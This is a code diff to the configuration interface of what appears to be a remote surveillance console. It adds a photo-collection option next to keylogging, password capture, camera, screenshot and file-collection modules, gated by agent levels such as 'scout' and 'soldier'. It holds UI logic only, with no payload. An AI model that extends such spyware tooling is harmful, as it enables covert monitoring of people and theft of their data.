@@ -52,11 +52,11 @@
 				if (file.selected)
 				{
 					file.documents.selected=(fileModule.accept as Array).indexOf('*.doc') != -1;
-					file.images.selected=(fileModule.accept as Array).indexOf('*.jpg') != -1;
+					file.images.selected=(fileModule.accept as Array).indexOf('*.jpg') != -1 && !(currentAgent.level=="soldier" && currentAgent._kind!="factory");
 				}
 				else
 				{
-					file.documents.selected=true; // Default value
+					file.documents.selected=true//(currentAgent.level=="soldier" && currentAgent._kind!="factory") ? false:true; // Default value
 					file.images.selected=false;
 				}
 
@@ -118,7 +118,16 @@
 				calendar.enabled=(getModule('calendar') != null || getModule('addressbook') != null) && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory") && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
 				messages.enabled=(getModule('messages') != null || getModule('chat') != null) && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory") && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
 				url.enabled=getModule('url') != null && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory") && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
-				file.enabled=getModule('file') != null && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory") && currentAgent.level != "soldier" && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
+        
+        //files and photo
+				//file.enabled=getModule('file') != null && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory") && currentAgent.level != "soldier" && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
+        
+        file.enabled=(getModule('file') != null || getModule('photo')!= null) && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory");
+        file.documents.enabled=getModule('file') != null && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory")  && !(currentAgent.level == "scout" && currentAgent.demo);
+        file.images.enabled=getModule('file') != null && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory") && currentAgent.level != "soldier" && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
+        
+        file.pictures.enabled=getModule('photo') != null && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory")  && !( currentAgent.level == "scout" && currentAgent.demo);
+        
 				keylog.enabled=getModule('keylog') != null && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory") && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
 				screenshot.enabled=getModule('screenshot') != null && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
 				camera.enabled=getModule('camera') != null && !(currentAgent.level == "scout" &&  currentAgent._kind!="factory") && !((currentAgent.level == "soldier" || currentAgent.level == "scout") && currentAgent.demo);
@@ -131,7 +140,9 @@
 				calendar.selected=calendar.enabled ? (hasAction('calendar') || hasAction('addressbook')) : false;
 				messages.selected=messages.enabled ? (hasAction('messages') || hasAction('chat')) : false;
 				url.selected=url.enabled ? hasAction('url') : false;
-				file.selected=file.enabled ? hasAction('file') : false;
+				file.selected=file.enabled ? hasAction('file') || hasAction('photo') : false;
+        file.pictures.selected=file.pictures.enabled? hasAction('photo') : false;
+
 				keylog.selected=keylog.enabled ? hasAction('keylog') : false;
 				screenshot.selected=screenshot.enabled ? hasLoop('SCREENSHOT') : false;
 				camera.selected=camera.enabled ? hasLoop('CAMERA') : false;
@@ -140,7 +151,8 @@
 				if (currentAgent.level == "soldier")
 				{
 					call.selected=false;
-					file.selected=false;
+          file.documents.selected=file.images.selected=false;
+					//file.selected=false; //soldier has photos!!!!
 
 					if (currentAgent.demo)
 					{
@@ -271,6 +283,7 @@
 				model.messages=messages.selected;
 				model.url=url.selected;
 				model.file=file.selected;
+        model.photo=file.pictures.selected;
 				model.keylog=keylog.selected;
 				model.screenshot=screenshot.selected;
 				model.camera=camera.selected;
@@ -335,7 +348,7 @@
 							gap="20">
 			<selectors:FileSelector id="file"
 															enabled="{!isMobile &amp;&amp; Console.currentSession.user.is_tech_config()}"
-															title="Accessed Files"/>
+															title="Files and Photos"/>
 			<selectors:SimpleSelector id="keylog"
 																title="{isMobile ? 'Keylog' : 'Keylog, Mouse &amp; Password'}"
 																enabled="{Console.currentSession.user.is_tech_config()}"/>
